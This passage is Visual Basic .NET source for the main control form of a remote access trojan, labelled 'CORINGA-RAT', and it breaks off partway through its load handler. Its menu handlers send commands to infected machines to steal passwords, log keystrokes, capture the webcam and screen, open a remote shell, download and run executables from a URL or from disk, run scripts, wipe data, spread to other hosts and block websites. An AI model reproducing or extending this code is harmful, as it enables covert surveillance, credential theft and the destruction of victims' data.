Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports System.Windows.Forms.ListView
Imports Microsoft.VisualBasic.Devices
Imports System.Runtime.CompilerServices
Imports Microsoft.Win32

Public Class FrmMain



    Sub New()

        Dim YyY As RegistryKey : YyY = Registry.CurrentUser.OpenSubKey("System\ST", True)
        If Not YyY Is Nothing Then 'EXISTE
            FrmAutenticacao.Show()
        End If

        Do While FrmAutenticacao.IsHandleCreated
            Application.DoEvents()
        Loop

        InitializeComponent()

    End Sub

    Public CEL As MdClient
    Public PMON As Boolean
    Public port As Integer
    Public S As MdSK
    Public sk As MdClient


    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {("un" & MdSokserver.Y & "!")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub



    Private Sub DisconnectToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles DisconnectToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                Try
                    NewLateBinding.LateSetComplex(current.Tag, Nothing, "CN", New Object() {False}, Nothing, Nothing, False, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Public Sub dsk()
        Dim num As Integer = 0
        Dim item As MdClient = Nothing
        Do While True
            Thread.Sleep(500)
            Try
                If ((MdSokserver.F.IMG Is MdSokserver.F.L1.SmallImageList) AndAlso (MdSokserver.ISAd.Count <= 10)) Then
                    num += 1
                    If (num > S.Online2.Count) Then
                        num = 1
                    End If
                    If (S.Online2.Count > 0) Then
                        item = DirectCast(S.Online2.Item(num), MdClient)
                        If ((Not item.Isend And (Not item.L Is Nothing)) AndAlso (item.L.SubItems.Count > 0)) Then
                            MdSokserver.ISAd.Add(item)
                            item.Isend = True
                            item.Send(String.Concat(New String() {"CAP", MdSokserver.Y, Conversions.ToString(MdSokserver.F.IMG.ImageSize.Width), MdSokserver.Y, Conversions.ToString(MdSokserver.F.IMG.ImageSize.Height)}))
                        End If
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        Loop
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = MdSokserver.GETPLG("fm.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    MdSokserver.SendPlug(DirectCast(current.Tag, MdClient), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub FromDISKToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FromDISKToolStripMenuItem1.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim FT As New OpenFileDialog
            FT.Title = "CORINGA-RAT"
            FT.Multiselect = False
            FT.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            FT.Filter = "ARQUIVOS (*.exe)|*.exe"
            FT.FileName = Nothing

            If (FT.ShowDialog = DialogResult.OK) Then
                Dim cM As Boolean = True
                Dim buffer As Byte() = MdFN.SB(Convert.ToBase64String(MdFN.ZIP(File.ReadAllBytes(FT.FileName), cM)))
                Dim stream As New MemoryStream
                Dim s As String = ("up" & MdSokserver.Y)
                stream.Write(MdFN.SB(s), 0, s.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim tt As New Thread(New ParameterizedThreadStart(AddressOf MdSokserver.SendTo), 1)
                tt.Start(New Object() {L1.SelectedItems, stream.ToArray, Color.Green})
            End If
        End If
    End Sub

    Private Sub FromLINKToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FromLINKToolStripMenuItem1.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim str2 As String = ("up" & MdSokserver.Y)
            Dim str As String = Interaction.InputBox("URL", "Informações", "", -1, -1)
            If (str <> "") Then
                Dim enumerator As IEnumerator = Nothing
                str2 = (str2 & str)
                Try
                    enumerator = L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            Dim arguments As Object() = New Object() {str2}
                            Dim copyBack As Boolean() = New Boolean() {True}
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                            If copyBack(0) Then
                                str2 = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                            End If
                            current.ForeColor = Color.Green
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If
    End Sub

    Private Sub GetPasswordsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = MdSokserver.GETPLG("pw.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    MdSokserver.SendPlug(DirectCast(current.Tag, MdClient), p, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"kl"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub L1_DoubleClick(ByVal sender As Object, ByVal e As EventArgs) Handles L1.DoubleClick
        If (L1.SelectedItems.Count > 0) Then

            If CKMostrarInformações.Checked = True Then
                DirectCast(L1.SelectedItems.Item(0).Tag, MdClient).Send("inf")
            End If

        End If
    End Sub

    Private Sub L1_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles L1.KeyDown
        Select Case e.KeyCode
            Case Keys.A
                If My.Computer.Keyboard.CtrlKeyDown Then
                    Dim items As ListViewItemCollection = L1.Items
                    SyncLock items
                        Dim enumerator As IEnumerator = Nothing
                        Try
                            enumerator = L1.Items.GetEnumerator
                            Do While enumerator.MoveNext
                                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                                current.Selected = True
                            Loop
                        Finally
                            If TypeOf enumerator Is IDisposable Then
                                TryCast(enumerator, IDisposable).Dispose()
                            End If
                        End Try
                    End SyncLock
                End If
                Exit Select
            Case Keys.Space
                L1.FX()
                Exit Select
        End Select
    End Sub

    Private Sub L1_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs) Handles L1.SelectedIndexChanged

        SEL.Text = ("Selecionados " & Conversions.ToString(L1.SelectedItems.Count))

        If (L1.SelectedItems.Count > 0) Then
            MdSokserver.ensr = False
        End If

        Dim box As PictureBox = PicMineDesktop
        SyncLock box

            If ((L1.SelectedItems.Count = 1) And (L1.SmallImageList Is IMG2)) Then
                CEL = DirectCast(L1.SelectedItems.Item(0).Tag, MdClient)

                If CKMostrarInformações.Checked = True Then


                    'MOSTRA MINE INFORMAÇÕES
                    Try
                        If (Not CEL.snf Is Nothing) Then

                            MdSokserver.F.LVListInfoO.Items.Item(0).Text = CEL.snf(0)

                            MdSokserver.F.LVListInfoO.Items.Item(1).Text = CEL.snf(1)

                            MdSokserver.F.LVListInfoO.Items.Item(2).Text = CEL.snf(2)

                            MdSokserver.F.LVListInfoO.Items.Item(3).Text = CEL.snf(3)

                            MdSokserver.F.LVListInfoO.Items.Item(4).Text = CEL.snf(4)

                            MdSokserver.F.LVListInfoO.Items.Item(5).Text = CEL.snf(5)

                            MdSokserver.F.LVListInfoO.Items.Item(6).Text = CEL.snf(6)

                            MdSokserver.F.LVListInfoO.Items.Item(7).Text = "%" & CEL.snf(7) & "%"

                            MdSokserver.F.LVListInfoO.Items.Item(8).Text = CEL.snf(8)

                            MdSokserver.F.LVListInfoO.Items.Item(9).Text = CEL.snf(9)

                            MdSokserver.F.LVListInfoO.Items.Item(10).Text = CEL.snf(10)

                        Else

                            MdSokserver.F.LVListInfoO.Items.Item(0).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(1).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(2).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(3).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(4).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(5).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(6).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(7).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(8).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(9).Text = ""

                            MdSokserver.F.LVListInfoO.Items.Item(10).Text = ""

                            CEL.Send("inf")

                        End If

                    Catch ex As Exception

                    End Try


                End If


                'MOSTRAR MINE DESKTOP
                If CKMostrarDesktop.Checked = True Then

                    If (Not CEL.pc Is Nothing) Then
                        Dim box2 As PictureBox = MdSokserver.F.PicMineDesktop
                        SyncLock box2
                            MdSokserver.F.PicMineDesktop.Image = DirectCast(CEL.pc.Clone, Image)
                        End SyncLock
                    End If
                    CEL.Send(String.Concat(New String() {"CAP", MdSokserver.Y, Conversions.ToString(PicMineDesktop.Width), MdSokserver.Y, Conversions.ToString(PicMineDesktop.Height)}))

                End If

            Else
                MdSokserver.F.PicMineDesktop.Image = Nothing
                CEL = Nothing
            End If
        End SyncLock
    End Sub


    Private Sub OpenChatToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles OpenChatToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = MdSokserver.GETPLG("ch.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    MdSokserver.SendPlug(DirectCast(current.Tag, MdClient), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub OpenFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles OpenFolderToolStripMenuItem.Click
        Try
            If Not Directory.Exists(Conversions.ToString(NewLateBinding.LateGet(L1.SelectedItems.Item(0).Tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing))) Then
                Directory.CreateDirectory(Conversions.ToString(NewLateBinding.LateGet(L1.SelectedItems.Item(0).Tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
            End If
            Dim objArray As Object() = New Object(1 - 1) {}
            Dim tag As Object = L1.SelectedItems.Item(0).Tag
            objArray(0) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing))
            Dim arguments As Object() = objArray
            Dim copyBack As Boolean() = New Boolean() {True}
            NewLateBinding.LateCall(Nothing, GetType(Process), "Start", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                NewLateBinding.LateSetComplex(tag, Nothing, "folder", New Object() {RuntimeHelpers.GetObjectValue(arguments(0))}, Nothing, Nothing, True, True)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub RegistryToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (MdSokserver.Gform(Conversions.ToString(Operators.ConcatenateObject("reg", NewLateBinding.LateGet(current.Tag, Nothing, "ip", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))) Is Nothing) Then
                    Dim reg As New FrmRegedit
                    reg.Name = Conversions.ToString(Operators.ConcatenateObject("reg", NewLateBinding.LateGet(current.Tag, Nothing, "ip", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
                    reg.sk = DirectCast(current.Tag, MdClient)
                    reg.Text = Conversions.ToString(MdSokserver.vno(reg.sk.L))
                    reg.Show()
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RemoteCamToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = MdSokserver.GETPLG("cam.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    MdSokserver.SendPlug(DirectCast(current.Tag, MdClient), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = MdSokserver.GETPLG("sc2.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    MdSokserver.SendPlug(DirectCast(current.Tag, MdClient), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub RemoteShellToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"rss"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RestartToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {("un" & MdSokserver.Y & "@")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ScriptToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ScriptToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim script As New FrmScrypt
            script.ShowDialog(Me)
            If (script.Code.Length > 0) Then
                Dim enumerator As IEnumerator = Nothing
                Dim strArray As String() = New String(5 - 1) {}
                strArray(0) = "rn"
                strArray(1) = MdSokserver.Y
                strArray(2) = script.RunAs
                strArray(3) = MdSokserver.Y
                Dim cM As Boolean = True
                strArray(4) = Convert.ToBase64String(MdFN.ZIP(MdFN.SB(script.Code), cM))
                Dim str As String = String.Concat(strArray)
                Try
                    enumerator = L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            Dim arguments As Object() = New Object() {str}
                            Dim copyBack As Boolean() = New Boolean() {True}
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                            If copyBack(0) Then
                                str = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                            End If
                            current.ForeColor = Color.Green
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If
    End Sub

    Private Sub Timer1_Elapsed(ByVal sender As Object, ByVal e As Timers.ElapsedEventArgs) Handles Timer1.Elapsed
        Try
            Dim box As PictureBox = PicMineDesktop
            SyncLock box
                If ((CEL Is Nothing) AndAlso (MdSokserver.F.LVListInfoO.Items.Item(0).Text <> "")) Then
                    Try
                        MdSokserver.F.LVListInfoO.Items.Item(0).Text = ""

                        MdSokserver.F.LVListInfoO.Items.Item(1).Text = ""

                        MdSokserver.F.LVListInfoO.Items.Item(2).Text = ""

                        MdSokserver.F.LVListInfoO.Items.Item(3).Text = ""

                        MdSokserver.F.LVListInfoO.Items.Item(4).Text = ""

                        MdSokserver.F.LVListInfoO.Items.Item(5).Text = ""

                        MdSokserver.F.LVListInfoO.Items.Item(6).Text = ""

                        MdSokserver.F.LVListInfoO.Items.Item(7).Text = ""

                        MdSokserver.F.LVListInfoO.Items.Item(8).Text = ""

                        MdSokserver.F.LVListInfoO.Items.Item(9).Text = ""

                        MdSokserver.F.LVListInfoO.Items.Item(10).Text = ""

                        MdSokserver.F.PicMineDesktop.Image = Nothing

                    Catch ex As Exception

                    End Try

                End If

            End SyncLock

        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles UninstallToolStripMenuItem.Click
        If MessageBox.Show("Deseja Mesmo Desinstalar ?", "Informações", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) = Windows.Forms.DialogResult.Yes Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Green
                    Try
                        NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {("un" & MdSokserver.Y & "~")}, Nothing, Nothing, Nothing, True)
                        Continue Do
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        ProjectData.ClearProjectError()
                        Continue Do
                    End Try
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ToolStripMenuItem2.Click
        Try
            If Not Directory.Exists(Conversions.ToString(NewLateBinding.LateGet(Me.L1.SelectedItems.Item(0).Tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing))) Then
                Directory.CreateDirectory(Conversions.ToString(NewLateBinding.LateGet(Me.L1.SelectedItems.Item(0).Tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
            End If
            Dim objArray As Object() = New Object(1 - 1) {}
            Dim tag As Object = Me.L1.SelectedItems.Item(0).Tag
            objArray(0) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing))
            Dim arguments As Object() = objArray
            Dim copyBack As Boolean() = New Boolean() {True}
            NewLateBinding.LateCall(Nothing, GetType(Process), "Start", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                NewLateBinding.LateSetComplex(tag, Nothing, "folder", New Object() {RuntimeHelpers.GetObjectValue(arguments(0))}, Nothing, Nothing, True, True)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub FormatSystemToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FormatSystemToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing 'By ReadDevel
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"del"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub SpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SpToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"spreading"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub OpenWebSiteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        If (L1.SelectedItems.Count <> 0) Then
            Dim str2 As String = ("OpenPage" & MdSokserver.Y)
            Dim str As String = Interaction.InputBox("Enter URL", "Update From LINK", "", -1, -1)
            If (str <> "") Then
                Dim enumerator As IEnumerator = Nothing
                str2 = (str2 & str)
                Try
                    enumerator = L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            Dim arguments As Object() = New Object() {str2}
                            Dim copyBack As Boolean() = New Boolean() {True}
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                            If copyBack(0) Then
                                str2 = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                            End If
                            current.ForeColor = Color.Green
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If


    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        Dim enumerator As IEnumerator = Nothing 'By ReadDevel
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"Restart"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing 'By ReadDevel
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                current.ForeColor = Color.Green
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"Shutdown"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem1.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim str2 As String = ("OpenPage" & MdSokserver.Y)
            Dim str As String = Interaction.InputBox("URL", "Informações", "", -1, -1)
            If (str <> "") Then
                Dim enumerator As IEnumerator = Nothing
                str2 = (str2 & str)
                Try
                    enumerator = L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            Dim arguments As Object() = New Object() {str2}
                            Dim copyBack As Boolean() = New Boolean() {True}
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                            If copyBack(0) Then
                                str2 = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                            End If
                            current.ForeColor = Color.Green
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If

    End Sub

    Private Sub BlockWebSiteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BlockWebSiteToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim str2 As String = ("BlocKPage" & MdSokserver.Y)
            Dim str As String = Interaction.InputBox("URL", "Informações", "", -1, -1)
            If (str <> "") Then
                Dim enumerator As IEnumerator = Nothing
                str2 = (str2 & str)
                Try
                    enumerator = L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            Dim arguments As Object() = New Object() {str2}
                            Dim copyBack As Boolean() = New Boolean() {True}
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                            If copyBack(0) Then
                                str2 = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                            End If
                            current.ForeColor = Color.Green
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If
    End Sub






    Private Sub FrmMain_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub



    Dim IMG11 As String = Application.StartupPath & "\imagens\img-1.png"
    Dim IMG22 As String = Application.StartupPath & "\imagens\img-2.png"

    Private Sub FrmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Control.CheckForIllegalCrossThreadCalls = False

        Application.DoEvents()
        Try

            Me.ForeColor = My.Settings.SeleCor

            LVListInfoO.Items.Item(0).ForeColor = My.Settings.SeleCor
            LVListInfoO.Items.Item(1).ForeColor = My.Settings.SeleCor
            LVListInfoO.Items.Item(2).ForeColor = My.Settings.SeleCor
            LVListInfoO.Items.Item(3).ForeColor = My.Settings.SeleCor
            LVListInfoO.Items.Item(4).ForeColor = My.Settings.SeleCor
            LVListInfoO.Items.Item(5).ForeColor = My.Settings.SeleCor
            LVListInfoO.Items.Item(6).ForeColor = My.Settings.SeleCor
            LVListInfoO.Items.Item(7).ForeColor = My.Settings.SeleCor
            LVListInfoO.Items.Item(8).ForeColor = My.Settings.SeleCor
            LVListInfoO.Items.Item(9).ForeColor = My.Settings.SeleCor
